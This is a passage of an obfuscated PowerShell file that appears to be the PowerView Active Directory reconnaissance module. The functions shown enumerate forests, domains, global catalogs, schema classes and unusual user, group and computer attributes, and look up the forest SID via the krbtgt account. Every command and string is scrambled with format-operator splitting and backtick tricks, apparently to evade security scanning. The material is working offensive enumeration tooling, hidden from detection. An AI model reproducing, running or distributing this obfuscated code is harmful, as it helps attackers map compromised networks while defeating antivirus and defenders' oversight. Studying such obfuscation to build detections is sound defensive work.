        if (${PsBO`UND`PAram`ETE`Rs}[("{2}{1}{0}{3}"-f 'n','de','Cre','tial')]) { ${a`RgUME`N`Ts}[("{0}{3}{1}{2}"-f'Cr','e','ntial','ed')] = ${C`ReD`ENtiaL} }

        if (${p`SBO`UND`PARametE`Rs}[("{1}{0}" -f 'AP','LD')] -or ${PS`BOU`N`DpAraM`eteRs}[("{0}{1}"-f'Serv','er')]) {
            if (${pS`Bo`UnDP`A`RAmE`TERS}[("{2}{0}{1}"-f've','r','Ser')]) { ${argU`m`ENtS}[("{1}{0}"-f'er','Serv')] = ${Serv`ER} }

            
            ${ARgum`e`Nts}[("{2}{1}{0}" -f 'r','te','LDAPFil')] = ("{5}{7}{1}{3}{4}{0}{6}{2}{9}{10}{8}" -f '55','trol:','.','1','.2.840.113','(us','6.1','erAccountCon','03:=8192)','4.','8')

            &("{4}{5}{0}{2}{1}{3}"-f 'mainCo','p','m','uter','Get-','Do') @Arguments
        }
        else {
            ${fOuNd`Do`MaIN} = &("{0}{2}{1}"-f'Get-Do','ain','m') @Arguments
            if (${FoU`NdDoM`A`iN}) {
                ${fOu`NDDo`maIN}."D`oMAinCO`NtR`ollErs"
            }
        }
    }
}


function G`eT-fO`RE`st {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{2}{1}{3}"-f'PSSh','ldPr','u','ocess','o'}, '')]
    [OutputType({"{8}{0}{1}{4}{6}{2}{5}{7}{10}{11}{12}{3}{9}"-f'y','stem','t.Au','tomObj','.Manage','tomation.','men','P','S','ect','S','C','us'})]
    [CmdletBinding()]
    Param(
        [Parameter(PositION = 0, VaLUeFRoMPIPElInE = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fO`ResT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEdE`N`TI`Al} =  (LS ("VarI"+"aBLE:0d"+"sQr")).valuE::"EmP`TY"
    )

    PROCESS {
        if (${P`sb`OuND`PARaMETERs}[("{2}{0}{1}"-f'e','dential','Cr')]) {

            &("{2}{1}{3}{0}{4}"-f'-Ver','t','Wri','e','bose') ("{1}{8}{2}{4}{10}{11}{6}{0}{3}{14}{9}{7}{13}{5}{15}{12}" -f ' ','[Get-For','] U','cr','sing a','ls fo','e','t','est','den','ltern','at','Forest','ia','e','r Get-')

            if (${pS`BOu`Nd`pARAMetE`Rs}[("{1}{0}{2}"-f'r','Fo','est')]) {
                ${t`AR`ge`TFORe`st} = ${F`oREST}
            }
            else {
                
                ${target`FOr`EST} = ${c`ReDE`N`TIAL}.("{2}{0}{1}{3}" -f 'Crede','n','GetNetwork','tial').Invoke()."d`oMAiN"
                &("{1}{2}{0}"-f'erbose','Wri','te-V') ('[Get'+'-Fore'+'st]'+' '+'E'+'xtra'+'cted'+' '+'dom'+'a'+'in '+"'$Forest' "+'from'+' '+'-Cr'+'ed'+'ential')
            }

            ${FOre`s`TC`oNtExt} = &("{0}{2}{1}{3}" -f'New-','bjec','O','t') ("{0}{15}{2}{3}{13}{5}{10}{14}{6}{12}{4}{8}{1}{7}{11}{16}{9}"-f'Syst','eD','m.','D','i','re','yServices.Ac','ir','v','ontext','c','ectory.Direct','t','i','tor','e','oryC')(("{0}{1}"-f 'Fo','rest'), ${TA`RG`EtF`OrEst}, ${CreDenT`I`AL}."uSeRn`AME", ${cRe`DENTi`Al}.("{3}{5}{4}{6}{2}{1}{0}" -f'tial','den','e','GetNetwo','kC','r','r').Invoke()."Passwo`Rd")

            try {
                ${fo`R`Es`TObJECt} =   (  Ls  ('VARiAb'+'LE:'+'BY3QHu')).vaLUE::("{1}{0}{2}" -f'For','Get','est').Invoke(${FORe`s`T`conteXt})
            }
            catch {
                &("{0}{1}{2}"-f 'Wr','ite','-Verbose') ('['+'Get-Fo'+'rest]'+' '+'The'+' '+'sp'+'ecifie'+'d '+'f'+'ores'+'t '+"'$TargetForest' "+'d'+'oes '+'not'+' '+'exist,'+' '+'co'+'ul'+'d '+'n'+'ot '+'be'+' '+'conta'+'c'+'ted'+', '+'the'+'re '+('i'+'sn{0}t ') -F[ChaR]39+'an'+' '+'exi'+'st'+'ing '+'tru'+'st,'+' '+'or'+' '+'the'+' '+'s'+'pecifie'+'d '+'cred'+'entials'+' '+'are'+' '+'i'+'nvalid'+': '+"$_")
                ${N`Ull}
            }
        }
        elseif (${pSBounDp`ARame`T`E`Rs}[("{1}{0}" -f 't','Fores')]) {
            ${foRES`TCo`NtEXt} = &("{2}{0}{1}" -f 'w-Ob','ject','Ne') ("{4}{12}{15}{3}{0}{14}{7}{9}{10}{5}{2}{8}{11}{1}{6}{13}" -f'Services.Ac','toryCon','D','tory','System.Di','y.','tex','veD','ire','irec','tor','c','re','t','ti','c')(("{1}{0}"-f'st','Fore'), ${F`Or`esT})
            try {
                ${f`O`REstob`jeCt} =  (  gEt-VaRiABle  by3QHu ).ValuE::("{2}{0}{1}"-f 'r','est','GetFo').Invoke(${fO`REsT`con`TE`xt})
            }
            catch {
                &("{0}{1}{2}"-f'Write-','V','erbose') ('[Get-F'+'orest]'+' '+'T'+'he '+'sp'+'e'+'cified'+' '+'fo'+'res'+'t '+"'$Forest' "+'doe'+'s '+'n'+'ot '+'exist'+', '+'coul'+'d '+'not'+' '+'be'+' '+'contact'+'ed'+','+' '+'or'+' '+'there'+' '+('isn'+'oh'+'M'+'t ')."r`eP`LAcE"('ohM',[STRINg][ChAR]39)+'a'+'n '+'existin'+'g'+' '+'tr'+'ust: '+"$_")
                return ${N`Ull}
            }
        }
        else {
            
            ${FO`R`ES`TobJ`ect} =   (  cHildItEM ("V"+"ari"+"ABLE"+":"+"by3QHU") ).valUE::("{4}{5}{2}{3}{1}{0}" -f'est','For','u','rrent','Get','C').Invoke()
        }

        if (${FoRe`s`T`objECt}) {
            
            if (${PsboUnDP`A`R`AM`etERs}[("{1}{2}{0}" -f'ial','Cre','dent')]) {
                ${ForEs`T`sid} = (&("{3}{2}{1}{4}{0}" -f'er','inU','-Doma','Get','s') -Identity ("{0}{1}" -f'krb','tgt') -Domain ${fO`REStobJE`Ct}."R`o`oTD`OMaiN"."Na`Me" -Credential ${cr`edENT`iAL})."object`s`iD"
            }
            else {
                ${fores`TS`id} = (&("{1}{2}{3}{0}" -f'er','Ge','t-DomainU','s') -Identity ("{0}{2}{1}" -f 'kr','tgt','b') -Domain ${F`oRE`STO`BJEct}."rOO`Tdo`MaIN"."na`ME")."Ob`jeCts`ID"
            }

            ${p`ARTS} = ${ForEsT`S`ID} -Split '-'
            ${F`O`REStsId} = ${PA`RtS}[0..$(${P`Ar`Ts}."l`E`NGth"-2)] -join '-'
            ${f`OrEsToBjE`cT} | &("{1}{0}{2}" -f'dd-Me','A','mber') ("{3}{0}{1}{2}" -f'tePro','pe','rty','No') ("{2}{3}{0}{1}" -f 'i','nSid','Roo','tDoma') ${for`Est`siD}
            ${FoR`est`o`Bje`Ct}
        }
    }
}


function g`ET-foresT`DOMa`in {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{4}{2}"-f'Pro','PSShould','s','ce','s'}, '')]
    [OutputType({"{8}{1}{5}{6}{7}{10}{2}{9}{3}{0}{4}" -f '.Doma','em.Di','ect','ry','in','rector','ySer','vices.Acti','Syst','o','veDir'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsItiOn = 0, vAluefrOMpIPelINE = ${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fO`Re`sT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`D`eNtial} =  (  CHILDiTEm ("vAr"+"iabLe"+":0"+"Dsqr")).vAlue::"EmP`Ty"
    )

    PROCESS {
        ${A`RgUmE`N`TS} = @{}
        if (${pS`BoUnDPA`RAM`EteRS}[("{1}{0}" -f'orest','F')]) { ${A`RGumeN`Ts}[("{0}{2}{1}" -f 'For','st','e')] = ${F`OrEst} }
        if (${PSb`ounDpaR`AM`ETErS}[("{3}{0}{2}{1}"-f'en','al','ti','Cred')]) { ${Ar`GUME`Nts}[("{0}{3}{1}{2}"-f 'Cred','nt','ial','e')] = ${crE`DEnt`IAL} }

        ${FO`R`estoB`j`Ect} = &("{2}{0}{1}" -f 'Fores','t','Get-') @Arguments
        if (${F`oR`eSt`objEct}) {
            ${f`OresTO`BjEcT}."DOM`AI`Ns"
        }
    }
}


function gEt`-f`or`eSTgl`Ob`AlCaTalog {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}{4}"-f 'ul','dProce','PS','Sho','ss'}, '')]
    [OutputType({"{12}{10}{6}{0}{11}{13}{1}{4}{2}{3}{9}{7}{8}{14}{5}"-f'y','.Ac','eDirec','to','tiv','obalCatalog','irector','y.','G','r','D','S','System.','ervices','l'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSitiON = 0, vaLueFroMPiPELINE = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`oresT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`EdEntI`AL} =   $0DSQR::"e`mPtY"
    )

    PROCESS {
        ${Argu`Me`NTS} = @{}
        if (${p`s`BOUnDPar`AMETe`Rs}[("{2}{1}{0}" -f'est','or','F')]) { ${ArG`UM`ENtS}[("{0}{1}" -f'For','est')] = ${FoRE`sT} }
        if (${psB`OuN`dp`ARaM`E`TeRs}[("{2}{1}{0}" -f 'al','i','Credent')]) { ${a`RGuM`EN`TS}[("{2}{1}{0}" -f'l','tia','Creden')] = ${CrE`d`e`NtiAL} }

        ${Fore`S`TObjEcT} = &("{1}{0}{2}"-f '-Fo','Get','rest') @Arguments

        if (${fOr`eSto`BjECt}) {
            ${f`oreStObJ`ecT}.("{1}{5}{0}{3}{2}{4}"-f'lC','FindAllGlob','ta','a','logs','a').Invoke()
        }
    }
}


function gE`T-FoRestsC`He`MaCLAss {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}" -f'ss','roce','PSShouldP'}, '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(posItiOn = 0, VALUeFroMpIPeliNE = ${T`RUe})]
        [Alias({"{1}{0}" -f 's','Clas'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`lA`sSNAme},

        [Alias({"{1}{0}" -f 'e','Nam'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fORe`st},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`d`E`NtIal} =   (  DIR variaBle:0DSqR  ).VaLUE::"EM`PTy"
    )

    PROCESS {
        ${A`RG`UmEnTS} = @{}
        if (${pSBO`UNDpaR`A`M`ETe`Rs}[("{0}{1}" -f 'Fo','rest')]) { ${ar`GUmE`NTs}[("{0}{1}"-f'F','orest')] = ${f`OreST} }
        if (${pSbou`NDP`ArAMet`ErS}[("{0}{1}{2}" -f'C','r','edential')]) { ${a`RGuM`ENtS}[("{1}{2}{0}"-f'l','Cr','edentia')] = ${cR`ed`ENTIaL} }

        ${For`E`s`TOBj`Ect} = &("{2}{0}{1}"-f 't-Fore','st','Ge') @Arguments

        if (${FOREST`ob`JecT}) {
            if (${pS`BOundParAME`TE`Rs}[("{2}{0}{1}"-f'a','ssName','Cl')]) {
                ForEach (${tARG`ET`CLA`SS} in ${ClAS`sNa`mE}) {
                    ${F`or`estOB`jECT}."S`CHemA".("{1}{0}"-f 'ass','FindCl').Invoke(${t`ArG`ETC`LAss})
                }
            }
            else {
                ${fo`Re`St`ObjeCT}."s`CHemA".("{1}{2}{0}{3}" -f 'a','F','indAllCl','sses').Invoke()
            }
        }
    }
}


function f`iNd-`doMAInob`Je`CtPRoPErT`Y`oUtLIer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{0}{2}{1}"-f'dPro','s','ces','houl','PSS'}, '')]
    [OutputType({"{3}{6}{5}{4}{0}{1}{2}" -f'ew.Pr','opertyOu','tlier','Po','Vi','er','w'})]
    [CmdletBinding(dEFaultpAramEtErSETNamE = {"{1}{2}{0}" -f'sName','C','las'})]
    Param(
        [Parameter(PoSItIOn = 0, maNdaTOry = ${t`RUE}, PARaMeTeRSETnAme = "CLa`sS`NAME")]
        [Alias({"{1}{0}" -f'ss','Cla'})]
        [ValidateSet({"{1}{0}" -f 'er','Us'}, {"{0}{1}" -f'G','roup'}, {"{2}{1}{0}"-f 'puter','m','Co'})]
        [String]
        ${clA`ss`Name},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${RefEre`NCe`pR`O`PE`RT`ySET},

        [Parameter(valUEfrompiPELIne = ${Tr`UE}, MaNDatoRY = ${T`RUe}, pAraMEtERsETnAme = "REfeR`EN`CE`oBjecT")]
        [PSCustomObject]
        ${rEf`e`Re`Nc`EoBjECT},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Fil','ter'})]
        [String]
        ${LDaPf`iL`T`eR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f'SPat','h','AD'})]
        [String]
        ${s`E`ArCHBa`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{3}{2}{4}" -f'n','Domai','rol','Cont','ler'})]
        [String]
        ${s`e`RVER},

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{0}{1}"-f 'One','Level'}, {"{1}{0}{2}"-f're','Subt','e'})]
        [String]
        ${S`eA`RCHSc`opE} = ("{2}{1}{0}"-f 'ee','r','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`EsUL`TPA`GeSI`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERvErTiM`eLIm`It},

        [Switch]
        ${TOmb`St`oNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRed`En`TI`Al} =   $0DsqR::"e`mpTY"
    )

    BEGIN {
        ${USeRrEFeR`E`NCepR`OPe`RTYSeT} = @(("{0}{1}{2}{3}" -f 'a','dm','incoun','t'),("{2}{0}{3}{1}" -f'ountex','s','acc','pire'),("{3}{2}{0}{1}" -f 'wo','rdtime','pass','bad'),("{3}{0}{1}{2}" -f'dp','wdco','unt','ba'),'cn',("{0}{1}" -f 'co','depage'),("{2}{0}{1}" -f'ryc','ode','count'),("{2}{1}{0}"-f'iption','r','desc'), ("{1}{2}{3}{0}"-f'name','d','i','splay'),("{2}{1}{3}{0}" -f'e','tin','dis','guishednam'),("{3}{0}{1}{4}{2}"-f 'gati','o','ata','dscorepropa','nd'),("{1}{2}{0}" -f 'name','giv','en'),("{0}{3}{1}{2}"-f'i','ncet','ype','nsta'),("{1}{4}{3}{0}{2}" -f'c','isc','t','temobje','riticalsys'),("{1}{0}{2}{3}" -f'ast','l','logo','ff'),("{2}{0}{1}"-f 'tl','ogon','las'),("{3}{5}{1}{2}{0}{4}" -f 'ta','ontim','es','l','mp','astlog'),("{2}{0}{1}"-f'ko','uttime','loc'),("{1}{2}{0}" -f 'nt','lo','goncou'),("{2}{1}{0}"-f'berof','em','m'),("{2}{5}{6}{8}{7}{4}{1}{3}{0}"-f 'tiontypes','cry','ms','p','n','ds-supp','or','ede','t'),("{1}{0}" -f'e','nam'),("{0}{1}{2}"-f 'objec','tcate','gory'),("{2}{0}{1}" -f 'e','ctclass','obj'),("{2}{0}{1}" -f 'ect','guid','obj'),("{0}{1}{2}"-f 'object','s','id'),("{1}{0}{2}" -f 'maryg','pri','roupid'),("{0}{1}{2}"-f'pwdlas','ts','et'),("{3}{0}{2}{1}"-f'ccou','ame','ntn','sama'),("{0}{1}{3}{2}"-f 's','amaccou','pe','ntty'),'sn',("{4}{5}{2}{0}{1}{3}" -f 'coun','tc','ac','ontrol','u','ser'),("{3}{2}{1}{0}"-f'lname','a','erprincip','us'),("{1}{2}{0}" -f'd','usnchan','ge'),("{1}{2}{0}" -f'ated','u','sncre'),("{3}{0}{1}{2}" -f'he','nch','anged','w'),("{3}{2}{1}{0}"-f 'ated','cre','n','whe'))

        ${GROupr`efere`NCePR`O`pE`RtySET} = @(("{3}{0}{2}{1}" -f'dminc','t','oun','a'),'cn',("{1}{2}{0}"-f 'on','des','cripti'),("{3}{2}{1}{0}" -f'ame','nguishedn','ti','dis'),("{3}{0}{1}{2}" -f 'rop','aga','tiondata','dscorep'),("{2}{0}{1}"-f'uptyp','e','gro'),("{2}{1}{0}"-f 'type','tance','ins'),("{5}{3}{1}{4}{2}{0}" -f't','ri','lsystemobjec','sc','tica','i'),("{1}{0}" -f 'er','memb'),("{0}{2}{1}" -f 'm','erof','emb'),("{0}{1}"-f'n','ame'),("{1}{2}{0}{3}" -f 'ateg','objec','tc','ory'),("{0}{2}{1}"-f'obje','ss','ctcla'),("{0}{1}{2}"-f'obje','ctg','uid'),("{0}{1}{2}"-f 'o','bjects','id'),("{0}{2}{3}{1}"-f 'sa','ame','macco','untn'),("{2}{0}{1}" -f'maccoun','ttype','sa'),("{1}{3}{0}{2}"-f 'emfla','s','gs','yst'),("{3}{1}{0}{2}"-f'g','han','ed','usnc'),("{0}{1}{2}"-f'usn','c','reated'),("{0}{2}{1}{3}" -f'w','n','hencha','ged'),("{0}{3}{2}{1}"-f'w','ted','encrea','h'))

        ${CoMPu`Ter`REf`erE`Nc`e`proPERT`y`set} = @(("{1}{3}{2}{0}" -f 's','accoun','expire','t'),("{4}{1}{2}{0}{3}" -f'm','sswordt','i','e','badpa'),("{2}{1}{0}" -f'count','pwd','bad'),'cn',("{0}{1}"-f 'co','depage'),("{2}{0}{3}{1}"-f't','de','coun','ryco'),("{0}{1}{3}{2}"-f 'disting','u','edname','ish'),("{3}{2}{0}{1}" -f'm','e','hostna','dns'),("{3}{0}{6}{2}{1}{5}{4}"-f'c','tiond','paga','ds','a','at','orepro'),("{1}{0}{2}{3}" -f 'stancet','in','y','pe'),("{0}{6}{4}{5}{2}{3}{1}" -f'i','mobject','t','e','y','s','scriticals'),("{1}{2}{0}"-f 'goff','lastl','o'),("{2}{1}{0}" -f 'n','go','lastlo'),("{4}{1}{2}{0}{3}{5}"-f'ont','a','stlog','ime','l','stamp'),("{2}{3}{0}{1}"-f 'alpoli','cyflags','lo','c'),("{0}{2}{1}" -f 'logonco','t','un'),("{0}{5}{7}{2}{1}{6}{8}{4}{3}" -f 'ms','enc','d','ntypes','tio','ds-suppor','r','te','yp'),("{0}{1}" -f 'nam','e'),("{2}{0}{1}" -f'bj','ectcategory','o'),("{2}{1}{0}"-f'ass','tcl','objec'),("{0}{2}{1}{3}"-f'o','ectg','bj','uid'),("{0}{1}"-f 'object','sid'),("{3}{2}{4}{1}{0}" -f'm','te','n','operati','gsys'),("{4}{0}{1}{2}{3}" -f'erating','s','ystemservicepa','ck','op'),("{4}{0}{1}{5}{2}{3}" -f'y','stem','ers','ion','operatings','v'),("{1}{0}{2}{3}"-f'imary','pr','group','id'),("{2}{0}{3}{1}" -f'l','tset','pwd','as'),("{3}{1}{2}{0}"-f'tname','am','accoun','s'),("{1}{0}{3}{2}" -f 't','samaccount','pe','y'),("{3}{4}{0}{2}{6}{1}{5}"-f'c','ip','ep','s','ervi','alname','rinc'),("{2}{1}{0}{3}"-f 'ntr','co','useraccount','ol'),("{2}{0}{1}"-f 'snchange','d','u'),("{2}{1}{3}{0}" -f'ted','ncre','us','a'),("{2}{1}{0}" -f'd','nge','whencha'),("{2}{0}{1}"-f'nc','reated','whe'))

        ${SE`ARC`H`eraRGuMe`Nts} = @{}
        if (${psb`Ou`NdpaR`AMEteRS}[("{0}{1}" -f 'Domai','n')]) { ${sEarCH`ERARGUme`N`TS}[("{0}{1}"-f 'Doma','in')] = ${D`oma`IN} }
        if (${pSB`OUndPARa`me`TeRs}[("{3}{2}{0}{1}" -f 'Fil','ter','P','LDA')]) { ${sEar`chER`ArgU`mE`Nts}[("{1}{2}{0}" -f 'ter','L','DAPFil')] = ${l`d`APfI`lTER} }
        if (${Ps`Bo`UNDPARAM`etErS}[("{0}{1}{2}"-f 'Se','a','rchBase')]) { ${SeaRC`hEra`Rgumen`TS}[("{1}{2}{0}"-f 'chBase','Sea','r')] = ${SeaR`C`hBA`sE} }
        if (${pSboun`dPAr`A`MeTE`RS}[("{2}{1}{0}"-f'er','erv','S')]) { ${sEarChER`AR`G`UMEnTs}[("{1}{0}"-f'erver','S')] = ${s`Erv`eR} }
        if (${P`sb`ouNdpaRAmE`TERs}[("{3}{2}{0}{1}"-f'c','ope','archS','Se')]) { ${sEaRC`he`RaRG`UmeNts}[("{2}{0}{1}" -f 'arc','hScope','Se')] = ${sE`ARc`hsCo`PE} }
        if (${PsBOu`ND`PAram`ETeRs}[("{4}{0}{1}{2}{3}" -f'es','ult','Pag','eSize','R')]) { ${SeAR`ch`ErAr`g`UMenTS}[("{3}{0}{4}{2}{1}" -f'sultPa','ize','eS','Re','g')] = ${r`eS`UlTp`AG`EsIZe} }
        if (${P`sBoUndparaM`ete`Rs}[("{2}{3}{0}{1}"-f 'verTi','meLimit','S','er')]) { ${Sea`RcHER`ARGU`MenTS}[("{3}{0}{2}{1}{4}" -f'rverTi','imi','meL','Se','t')] = ${s`ERvERTImeli`M`iT} }
        if (${PSb`oUnDPA`RAMe`TErS}[("{1}{0}" -f'stone','Tomb')]) { ${sear`cHerAr`guM`EnTs}[("{2}{0}{1}" -f'm','bstone','To')] = ${tOM`BS`To`Ne} }
        if (${psBOUndp`A`RAmE`Te`Rs}[("{0}{3}{1}{2}" -f'C','d','ential','re')]) { ${seAR`CheRaR`g`UMe`NtS}[("{0}{2}{3}{1}"-f'Cr','tial','e','den')] = ${cr`e`DeNT`iAL} }

        
        if (${pSBoUn`dP`A`RameteRs}[("{1}{0}" -f 'n','Domai')]) {
            if (${Ps`BoU`NDp`ARAmETE`Rs}[("{2}{1}{0}" -f'ial','redent','C')]) {
                ${taRGeT`FoR`esT} = &("{2}{0}{1}"-f'-Dom','ain','Get') -Domain ${dO`m`AIN} | &("{1}{2}{0}" -f '-Object','Se','lect') -ExpandProperty ("{0}{2}{1}" -f'F','rest','o') | &("{1}{0}{3}{2}" -f 'ec','Sel','bject','t-O') -ExpandProperty ("{0}{1}" -f'Na','me')
            }
            else {
                ${tArgETf`o`REsT} = &("{1}{2}{0}{3}"-f 'omai','G','et-D','n') -Domain ${Do`MaIn} -Credential ${CReD`En`TIAL} | &("{3}{1}{0}{2}"-f'ec','t-Obj','t','Selec') -ExpandProperty ("{0}{1}"-f'For','est') | &("{2}{0}{1}{3}"-f 't','-Ob','Selec','ject') -ExpandProperty ("{1}{0}" -f'ame','N')
            }
            &("{4}{2}{1}{3}{0}"-f 'bose','t','i','e-Ver','Wr') ('[Find-Do'+'ma'+'inObjectP'+'ro'+'pe'+'r'+'tyOutlier'+'] '+'Enu'+'me'+'rated '+'fore'+'s'+'t '+"'$TargetForest' "+'fo'+'r '+'tar'+'g'+'et '+'domain'+' '+"'$Domain'")
        }

        ${s`cheMa`AR`gUMenTs} = @{}
        if (${pSBO`Und`PArAm`ETErs}[("{2}{1}{0}"-f 'tial','n','Crede')]) { ${Sc`he`M`AAr`GUMeNTS}[("{2}{0}{1}" -f 'entia','l','Cred')] = ${c`Red`eN`TIal} }
        if (${TaR`getfoR`EsT}) {
            ${SChe`MaArg`UMe`N`TS}[("{1}{0}"-f 't','Fores')] = ${TAr`GeTF`OreST}
        }
    }

    PROCESS {

        if (${PSBo`Un`dP`AR`AMete`Rs}[("{3}{2}{4}{1}{0}" -f 'tySet','r','n','Refere','cePrope')]) {
            &("{3}{0}{1}{2}"-f'-V','erb','ose','Write') ("{15}{9}{8}{10}{4}{16}{14}{5}{0}{11}{6}{17}{12}{3}{1}{18}{7}{2}{13}" -f'opert','c','cePropert','pe','Domai','ectPr','lier] Usin','n','ind','F','-','yOut','s','ySet','Obj','[','n','g ','ified -Refere')
            ${RE`F`erENce`OBjeCTPr`op`erT`ieS} = ${rEF`eR`E`NCEp`RoPE`RtYSET}
        }
        elseif (${psB`oU`NdPARame`TErs}[("{2}{1}{3}{0}"-f'ect','re','Refe','nceObj')]) {
            &("{1}{2}{0}" -f 'bose','W','rite-Ver') ("{13}{1}{6}{14}{10}{4}{17}{12}{19}{8}{5}{16}{15}{18}{2}{11}{3}{9}{7}{0}{20}"-f 'y se','Find-DomainObjectPropert','he r','nce','am','c','yOu','pert','n',' pro','Extracting property n','efere',' -Re','[','tlier] ','to use','eObject ','es from',' as t','fere','t')
            ${R`e`FEREnceO`BJecTprope`RT`i`ES} = &("{1}{0}{2}"-f't-Membe','Ge','r') -InputObject ${RE`FEren`ceobj`eCT} -MemberType ("{0}{1}{2}{3}"-f 'No','t','eP','roperty') | &("{1}{0}{2}{3}" -f'elec','S','t-Obj','ect') -Expand ("{0}{1}" -f 'Na','me')
            ${r`EF`ERE`NceoBJecTclA`sS} = ${rEfEr`E`N`CEobje`ct}."oB`jeC`TcL`Ass" | &("{1}{3}{0}{2}"-f 'j','Select-O','ect','b') -Last 1
            &("{2}{1}{3}{4}{0}" -f'se','it','Wr','e-V','erbo') ('[Fi'+'n'+'d-Do'+'mai'+'nObject'+'Pro'+'perty'+'Outlier] '+'C'+'a'+'l'+'culated '+'Refe'+'renc'+'eObje'+'c'+'tC'+'lass'+' '+': '+"$ReferenceObjectClass")
        }
        else {
            &("{2}{3}{0}{1}"-f'o','se','W','rite-Verb') ('['+'Find'+'-D'+'om'+'ai'+'nObje'+'c'+'tProp'+'ertyOutlier]'+' '+'Using'+' '+'th'+'e '+'d'+'efault '+'ref'+'ere'+'nce '+'p'+'roperty '+'s'+'et '+'for'+' '+'the'+' '+'ob'+'ject '+'c'+'lass '+"'$ClassName'")
        }

        if ((${C`l`AssnaMe} -eq ("{1}{0}" -f'ser','U')) -or (${REFEr`eNCe`obJEcT`clAsS} -eq ("{1}{0}" -f'er','Us'))) {
            ${o`BjeC`TS} = &("{3}{4}{0}{2}{1}" -f 'a','ser','inU','Get','-Dom') @SearcherArguments
            if (-not ${REfe`R`E`Nc`EOBJ`eCtpRoPERTI`ES}) {
                ${rE`FE`RENC`EobjEc`T`p`R`Op`erTIEs} = ${uSer`ReF`eR`en`CEpROPe`Rtyset}
            }
        }
        elseif ((${C`LaSS`NA`me} -eq ("{1}{0}"-f'roup','G')) -or (${reFE`R`ENCEOb`JeCT`cla`SS} -eq ("{0}{1}"-f'Grou','p'))) {
            ${oB`jE`Cts} = &("{1}{2}{3}{0}" -f 'p','Get-','DomainG','rou') @SearcherArguments
            if (-not ${Re`Fe`Rence`oB`JE`CT`PrOpErtIEs}) {
                ${reF`erEn`cEoBj`ect`pr`oPerTIeS} = ${GROU`p`Re`FE`ReNc`Ep`RoP`ERTYseT}
            }
        }
        elseif ((${c`lASsna`Me} -eq ("{1}{0}" -f 'ter','Compu')) -or (${r`e`F`E`RENCEobJE`cTcl`AsS} -eq ("{1}{0}" -f 'uter','Comp'))) {
            ${OBJe`C`TS} = &("{1}{3}{2}{0}" -f 'r','Get-Domain','ompute','C') @SearcherArguments
            if (-not ${rEFe`R`ENCEo`B`JeCTP`ROPeRt`IES}) {
                ${reF`Er`eNCeoB`JeC`TprOP`eRtI`es} = ${cOM`PUterRefER`eNCEP`RO`P`e`RtySeT}
            }
        }
        else {
            throw ('[F'+'ind-'+'Doma'+'i'+'nObjectPr'+'o'+'per'+'t'+'yOu'+'tl'+'ier] '+'Inv'+'a'+'lid '+'c'+'la'+'ss: '+"$ClassName")
        }

        ForEach (${OBjE`CT} in ${o`BJEC`Ts}) {
            ${ObJ`Ectp`RO`pErTieS} = &("{2}{0}{1}{3}" -f 'Me','mbe','Get-','r') -InputObject ${o`BJe`ct} -MemberType ("{2}{1}{3}{0}"-f'ty','tePrope','No','r') | &("{0}{3}{2}{1}"-f'Se','t','ect-Objec','l') -Expand ("{0}{1}"-f'N','ame')
            ForEach(${O`B`jEcT`PROperty} in ${oBjeCT`pr`OPER`TIES}) {
                if (${Re`FeR`EN`cE`ObjEct`pR`opErt`iES} -NotContains ${objEctP`R`ope`Rty}) {
                    ${O`Ut} = &("{2}{0}{1}" -f 'w-Objec','t','Ne') ("{1}{0}{2}" -f 'b','PSO','ject')
                    ${O`UT} | &("{1}{2}{0}" -f'mber','A','dd-Me') ("{2}{1}{0}"-f 'rty','oteprope','N') ("{1}{3}{0}{2}" -f'tNa','SamAccou','me','n') ${oBj`E`cT}."Sam`ACCoU`NT`NamE"
                    ${o`Ut} | &("{0}{2}{3}{1}"-f'A','ber','dd-M','em') ("{3}{0}{2}{1}"-f 'e','rty','prope','Not') ("{2}{1}{0}" -f 'perty','ro','P') ${Ob`JeCT`PRO`Per`Ty}
                    ${O`Ut} | &("{2}{0}{1}" -f'dd-Membe','r','A') ("{0}{2}{3}{1}"-f'N','perty','otep','ro') ("{0}{1}" -f 'Va','lue') ${oBJe`cT}.${Obj`eCtPR`OPEr`TY}
                    ${O`UT}."P`sOB`JeCt"."typE`N`AMeS".("{0}{1}"-f 'I','nsert').Invoke(0, ("{1}{0}{3}{4}{2}" -f'ro','PowerView.P','er','pertyOutl','i'))
                    ${o`Ut}
                }
            }
        }
    }
}








function Get`-DOmaiNu`ser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{5}{7}{1}{6}{3}{2}{0}" -f 'gnments','r','ssi','A','P','SUseDe','eThan','claredVarsMo'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{0}"-f'ss','e','PSS','houldProc'}, '')]
    [OutputType({"{1}{0}{2}"-f 'rVi','Powe','ew.User'})]
